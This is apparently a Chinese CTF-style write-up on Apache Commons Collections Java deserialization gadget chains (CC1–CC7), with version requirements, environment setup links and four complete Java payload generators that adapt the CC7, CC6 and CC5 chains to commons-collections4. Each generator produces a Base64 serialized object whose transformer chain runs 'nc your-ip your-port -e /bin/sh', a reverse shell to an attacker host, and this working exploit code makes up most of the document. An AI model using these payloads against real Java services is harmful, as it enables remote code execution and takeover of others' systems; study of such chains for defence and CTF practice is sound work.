
CommonsCollections包为Java标准的CollectionsAPi提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。
简称cc，第三方依赖库，被许多组件和项目所依赖，cc在很多项目或者组件中都有使用，
然而3和4相关版本存在反序列化利用链（Gadget）当出现反序列化入口时候，就存在反序列化漏洞。
Web和网络安全中"Gadget"一词通常指的是可以被利用来进行攻击的对象或代码片段。

cc链就是靠攻击者可利用cc库中目标类中实现了readObject方法反序列化会被自动调用，进一步调用transform相关类里可以反射且参数可控，反射代码和命令执行。

## **环境**
CommonsCollections版本为3.2.1时漏洞最多。
```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version>
    </dependency>
</dependencies>
```
java老版本下载：<https://blog.lupf.cn/articles/2022/02/19/1645283454543.html> 密码8899
复现环境配置：<https://www.freebuf.com/articles/web/383152.html>

安装jdk<=8u65，解压里面的src.zip。
安装jdk8源码，复制里面sun(jdk-af660750b2f4\src\share\native\sun)目录到刚刚解压的src目录下，这样可以跟踪jdk源码。


## **要求**
CC1链：java<=JDK8u71(1.8.0_71)、CommonsCollections<=3.2.1
>常见jdk=8u65进行复现。借助类Transformer

CC6链：java<=JDK8u71(1.8.0_71)、CommonsCollections<=3.2.1
>这条链是基于CC1，只是入口类改了，入口类为hashMap。CC6=CC1+URLDNS。


CC3链：java<=JDK8u71(1.8.0_71)、CommonsCollections<=3.2.1
>CC1 链与 CC6 链是通过 Runtime.exec() 进行命令执行的。而很多时候服务器的代码当中的黑名单会选择禁用 Runtime。​
CC3 链则是通过动态加载类加载机制来实现自动执行恶意类代码的。

CC4链：java<=JDK8u71(1.8.0_71)、CommonsCollections=4
>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化​。
CC4链找到InvokerTransformer的替换。

CC2链：java<=JDK8u71(1.8.0_71)、CommonsCollections=4
>CC2链是在CC4链的基础上修改。

CC7链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
CC5链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1  借助LazyMap


^
## **链改造绕过**
CC7链改成适用CommonsCollections=4。
```
package show.ctf.java;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class web851 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        // 先传进来一个空的，防止在put里面的equals触发
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        HashMap<Object,Object> hashMap1 = new HashMap<>();
        HashMap<Object,Object> hashMap2 = new HashMap<>();

        // 在java中yy和zZ的hashCode是一样的
        Map<Object,Object> lazyMap1 = LazyMap.lazyMap(hashMap1,chainedTransformer);
        lazyMap1.put("yy", 1);
        Map<Object,Object> lazyMap2 = LazyMap.lazyMap(hashMap2,chainedTransformer);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Class c = chainedTransformer.getClass();
        Field iTransformers = c.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformers);

        // LazyMap.get中会多生成一个yy
        lazyMap2.remove("yy");

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashtable);

        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
        String payload = Base64.getEncoder().encodeToString(payloadBytes);
        System.out.println(payload);
//        serialize(hashtable);
//        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

CC6链改成适用CommonsCollections=4。


```
package show.ctf.java;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.*;

public class web851 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        // 改成ConstantTransformer是为了防止put的时候就被使用
        Map<Object,Object> lazyMap = LazyMap.lazyMap(map,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"evo1");

        HashMap<Object,Object> map2 = new HashMap<>();
        map2.put(tiedMapEntry,"evo2");

        // 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false
        // 但是序列化后这个key会被放进去，所以需要再去掉
        lazyMap.remove("evo1");

        Class c = LazyMap.class;
        Field factory = c.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(map2);

        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
        String payload = Base64.getEncoder().encodeToString(payloadBytes);
        System.out.println(payload);

//        serialize(map2);
//        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

^
CC5链改成适用CommonsCollections=4。借助类DefaultedMap。


```
package show.ctf.java;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;

public class web854 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        DefaultedMap defaultedMap = new DefaultedMap(chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,"evo1");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("evo");

        Class bc = badAttributeValueExpException.getClass();
        Field val = bc.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,tiedMapEntry);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);

        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
        String payload = Base64.getEncoder().encodeToString(payloadBytes);
        System.out.println(payload);

//        serialize(badAttributeValueExpException);
//        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```


^
CC6链改成适用CommonsCollections=4。借助类DefaultedMap。


```
package show.ctf.java;

import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.DefaultedMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class web854 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        DefaultedMap defaultedMap = new DefaultedMap(chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(defaultedMap,"evo1");

        HashMap<Object,Object> map = new HashMap<>();
        map.put(tiedMapEntry,"evo2");


        Class c = ChainedTransformer.class;
        Field iTransformers = c.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformers);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(map);

        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
        String payload = Base64.getEncoder().encodeToString(payloadBytes);
        System.out.println(payload);

//        serialize(map);
//        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```


